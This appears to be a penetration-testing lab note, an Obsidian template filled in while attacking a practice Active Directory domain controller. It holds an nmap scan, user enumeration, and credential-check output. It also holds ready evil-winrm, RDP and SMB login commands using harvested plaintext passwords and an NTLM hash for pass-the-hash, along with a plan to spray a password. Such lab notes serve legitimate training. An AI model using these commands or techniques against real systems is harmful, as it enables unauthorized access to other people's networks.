[[Active Notes Template]]


```
Administrator:ItachiUchiha888
```

```
HotelCalifornia194!
```

```
smbclient \\192.168.242.175\Password Audit
```

```
evil-winrm -i 192.168.242.175 -u V.Ventz -p 'HotelCalifornia194!'
```

```
xfreerdp3 /u:V.Ventz /p:'HotelCalifornia194!' /v:192.168.242.175
```

```
cd ~/Desktop/Tools/Windows && ./nxc-sweep 192.168.242.175 -u 'Administrator' -p 'ItachiUchiha888'
```

```
xfreerdp3 /u:resourced.local\Administrator /p:ItachiUchiha888 /v:192.168.242.175 /cert:ignore /dynamic-resolution +clipboard
```

```
xfreerdp3 /u:resourced.local\\Administrator /p:'ItachiUchiha888' /v:192.168.242.175
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `evil-winrm -i ${ip} -u L.Livingstone -p 'ItachiUchiha888'`;

dv.paragraph("```bash\n" + command + "\n```");
```


```
evil-winrm -i 192.168.242.175 -u resourced.local\\L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```

## Provided Credentials
---

```

```

```

```

---
## Open Ports

```powershell
TCP
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-20 12:39:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-20T12:40:46+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-20T12:40:06+00:00
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2026-08-19T12:35:23
|_Not valid after:  2027-02-18T12:35:23
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC

PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

```

Evil Win-rm is open
RDP is open

---
## Software Versions

```powershell
Windows 10 / Server 2019 Build 17763 x64 
```

---
## Discovered Subdomains

---
## Discovered Credentials

rpcclient $> enumdomains
name:[resourced] idx:[0x0]


user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458]

index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant	Name: (null)	Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg	Name: (null)	Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson	Name: (null)	Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen	Name: (null)	Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone	Name: (null)	Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason	Name: (null)	Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker	Name: (null)	Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson	Name: (null)	Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson	Name: (null)	Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz	Name: (null)	Desc: New-hired, reminder: HotelCalifornia194!

```powershell
[+] Port 445 open. Checking smb ...
SMB         192.168.242.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.242.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.242.175 445    RESOURCEDC       [*] Enumerated shares
SMB         192.168.242.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.242.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.242.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.242.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.242.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.242.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
SMB         192.168.242.175 445    RESOURCEDC       Password Audit  READ            
SMB         192.168.242.175 445    RESOURCEDC       SYSVOL          READ            Logon server share 

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.242.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local) 
WINRM       192.168.242.175 5985   RESOURCEDC       [-] resourced.local\V.Ventz:HotelCalifornia194!

[+] Port 3389 open. Checking rdp ...
RDP         192.168.242.175 3389   RESOURCEDC       [*] Windows 10 or Windows Server 2016 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (nla:False)
RDP         192.168.242.175 3389   RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 

[+] Port 389 open. Checking ldap ...
LDAP        192.168.242.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.242.175 389    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 

[+] Port 636 open. Checking ldap ...
LDAP        192.168.242.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.242.175 389    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 

[+] Port 135 open. Checking wmi ...
RPC         192.168.242.175 135    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
RPC         192.168.242.175 135    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
```


---
## Interesting Files/Paths

---
## Attack Ideas

---
## Steps to User.txt

Enum4Linux ran and found that Account: V.Ventz	Name: (null)	Desc: New-hired, reminder: HotelCalifornia194!

Attempt to spray this password

---
## Steps to root.txt

---
## User Flag

```

```

## Root Flag

```

```